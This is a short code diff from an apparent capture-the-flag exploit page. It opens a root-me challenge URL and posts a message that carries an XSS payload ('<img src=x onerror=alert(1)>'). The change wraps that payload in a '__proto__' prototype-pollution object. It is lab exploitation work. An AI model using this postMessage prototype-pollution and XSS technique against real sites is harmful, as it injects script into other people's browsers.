@@ -11,7 +11,7 @@
             const target = window.open('http://node2.challenges.ctf20k.root-me.org:36975/');
            
             setTimeout(() => {
-                target.postMessage('{"urgentMessage":"<img src=x onerror=alert(1)>"}', '*');
+              target.postMessage('{"__proto__":{"urgentMessage":"<img src=x onerror=alert(1)>"}}', '*');
             }, 1000);
         };
     </script>
